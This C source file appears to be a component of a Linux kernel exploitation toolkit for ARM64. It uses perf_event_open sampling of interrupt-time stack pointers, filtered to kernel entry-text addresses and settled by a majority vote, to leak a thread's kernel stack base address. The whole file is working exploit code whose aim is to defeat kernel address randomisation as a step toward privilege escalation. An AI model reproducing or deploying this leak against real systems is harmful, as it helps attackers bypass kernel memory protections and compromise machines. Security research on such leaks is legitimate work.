#include "offset.h"

#ifdef STAMP_STACK_FRAME_OFF

#define _GNU_SOURCE

#include <errno.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "kernelsnitch/utils.h"

#ifndef STAMP_STACK_THREAD_SIZE
#define STAMP_STACK_THREAD_SIZE 0x4000ULL
#endif
#ifndef STAMP_STACK_SAMPLE_PERIOD
#define STAMP_STACK_SAMPLE_PERIOD 10000ULL
#endif
#ifndef STAMP_STACK_SAMPLE_USEC
#define STAMP_STACK_SAMPLE_USEC 90000
#endif

#ifndef STAMP_STACK_DEPTH_UNIT
#define STAMP_STACK_DEPTH_UNIT 1024ULL
#endif
#ifndef STAMP_STACK_DEPTH_SLOT
#define STAMP_STACK_DEPTH_SLOT 15ULL
#endif

#define PERF_TYPE_SOFTWARE_LOCAL     1
#define PERF_SAMPLE_IP_LOCAL         (1ULL << 0)
#define PERF_SAMPLE_TID_LOCAL        (1ULL << 1)
#define PERF_SAMPLE_REGS_INTR_LOCAL  (1ULL << 18)
#define PERF_RECORD_SAMPLE_LOCAL     9
#define PERF_REG_ARM64_SP_LOCAL      31

#define PERF_IOC_ENABLE_LOCAL  0x2400
#define PERF_IOC_DISABLE_LOCAL 0x2401
#define PERF_IOC_RESET_LOCAL   0x2403

#define MMAP_PAGES      8
#define MMAP_DATA_BYTES (MMAP_PAGES * 4096)
#define MMAP_TOTAL      (MMAP_DATA_BYTES + 4096)
#define MAX_CANDIDATES  64

#define PERF_FLAG_DISABLED     (1ULL << 0)
#define PERF_FLAG_EXCLUDE_USER (1ULL << 4)

struct perf_attr_raw {
    uint32_t type;
    uint32_t size;
    uint64_t config;
    uint64_t sample_period;
    uint64_t sample_type;
    uint64_t read_format;
    uint64_t flags;
    uint32_t wakeup_events;
    uint32_t bp_type;
    uint64_t config1;
    uint64_t config2;
    uint64_t branch_sample_type;
    uint64_t sample_regs_user;
    uint32_t sample_stack_user;
    int32_t  clockid;
    uint64_t sample_regs_intr;
    uint32_t aux_watermark;
    uint16_t sample_max_stack;
    uint16_t __reserved_2;
    uint32_t aux_sample_size;
    uint32_t __reserved_3;
    uint64_t sig_data;
    uint64_t config3;
};

static uint64_t collect_once(int tid, uint64_t *out, int max_out,
                             int *sample_count) {
    struct perf_attr_raw attr;
    memset(&attr, 0, sizeof(attr));
    attr.type             = PERF_TYPE_SOFTWARE_LOCAL;
    attr.size             = 0x88;
    attr.config           = 0;
    attr.sample_period    = STAMP_STACK_SAMPLE_PERIOD;
    attr.sample_type      = PERF_SAMPLE_IP_LOCAL | PERF_SAMPLE_TID_LOCAL |
                            PERF_SAMPLE_REGS_INTR_LOCAL;
    attr.flags            = PERF_FLAG_DISABLED | PERF_FLAG_EXCLUDE_USER;
    attr.sample_regs_intr = 1ULL << PERF_REG_ARM64_SP_LOCAL;

    int fd = (int)syscall(__NR_perf_event_open, &attr, tid, -1, -1, 0UL);
    if (fd < 0) {
        pr_warning("Stack leak: perf_event_open tid=%d errno=%d\n", tid, errno);
        return 0;
    }

    void *map = mmap(NULL, MMAP_TOTAL, PROT_READ | PROT_WRITE,
                     MAP_SHARED, fd, 0);
    if (map == MAP_FAILED) {
        pr_warning("Stack leak: perf mmap errno=%d\n", errno);
        close(fd);
        return 0;
    }

    ioctl(fd, PERF_IOC_RESET_LOCAL, 0);
    ioctl(fd, PERF_IOC_ENABLE_LOCAL, 0);
    usleep(STAMP_STACK_SAMPLE_USEC);
    ioctl(fd, PERF_IOC_DISABLE_LOCAL, 0);
    __atomic_thread_fence(__ATOMIC_SEQ_CST);

    const char *base = (const char *)map;
    uint64_t head = *(const volatile uint64_t *)(base + 1024);
    uint64_t tail = *(const volatile uint64_t *)(base + 1032);

    const uint64_t lo = (uint64_t)KIMAGE_TEXT_BASE_DEFAULT +
                        (uint64_t)STAMP_ENTRY_TEXT_START_OFF;
    const uint64_t hi = (uint64_t)KIMAGE_TEXT_BASE_DEFAULT +
                        (uint64_t)STAMP_ENTRY_TEXT_END_OFF;
    int found = 0, seen = 0;

    while (tail < head && found < max_out) {
        const char *rec = base + 4096 + (tail & (MMAP_DATA_BYTES - 1));
        uint32_t rtype = *(const uint32_t *)rec;
        uint16_t rsize = *(const uint16_t *)(rec + 6);
        if (rsize == 0)
            break;

        if (rtype == PERF_RECORD_SAMPLE_LOCAL) {
            seen++;
            uint64_t ip = *(const uint64_t *)(rec + 8);
            uint32_t rt = *(const uint32_t *)(rec + 20);
            if (ip >= lo && ip < hi && rt == (uint32_t)tid) {
                uint64_t sp = *(const uint64_t *)(rec + 32);
                uint64_t within = sp & (STAMP_STACK_THREAD_SIZE - 1);
                if (sp >= 0xffffff8000000000ULL && within != 0 &&
                    within / STAMP_STACK_DEPTH_UNIT == STAMP_STACK_DEPTH_SLOT)
                    out[found++] = sp & ~(STAMP_STACK_THREAD_SIZE - 1);
            }
        }

        tail += rsize;
    }

    munmap(map, MMAP_TOTAL);
    close(fd);
    if (sample_count)
        *sample_count = seen;
    return (uint64_t)found;
}

static uint64_t vote(const uint64_t *v, int n) {
    uint64_t best = 0;
    int best_hits = 0;
    for (int i = 0; i < n; i++) {
        int hits = 0;
        for (int j = 0; j < n; j++)
            if (v[j] == v[i])
                hits++;
        if (hits > best_hits) {
            best_hits = hits;
            best = v[i];
        }
    }
    return best;
}

uint64_t perf_stack_base(int tid) {
    uint64_t cand[MAX_CANDIDATES];
    int seen = 0;
    uint64_t n = collect_once(tid, cand, MAX_CANDIDATES, &seen);
    if (n == 0) {
        pr_warning("Stack leak: no entry-text sample for tid=%d (%d samples)\n",
                   tid, seen);
        return 0;
    }
    uint64_t base = vote(cand, (int)n);
    pr_debug("Stack leak: tid=%d samples=%d usable=%llu base=%#llx\n",
             tid, seen, (unsigned long long)n, (unsigned long long)base);
    return base;
}

uint64_t perf_stack_base_stable(int tid) {
    uint64_t a = perf_stack_base(tid);
    if (!a)
        return 0;
    uint64_t b = perf_stack_base(tid);
    if (a != b) {
        pr_warning("Stack leak: unstable base for tid=%d (%#llx vs %#llx)\n",
                   tid, (unsigned long long)a, (unsigned long long)b);
        return 0;
    }
    return a;
}

#endif
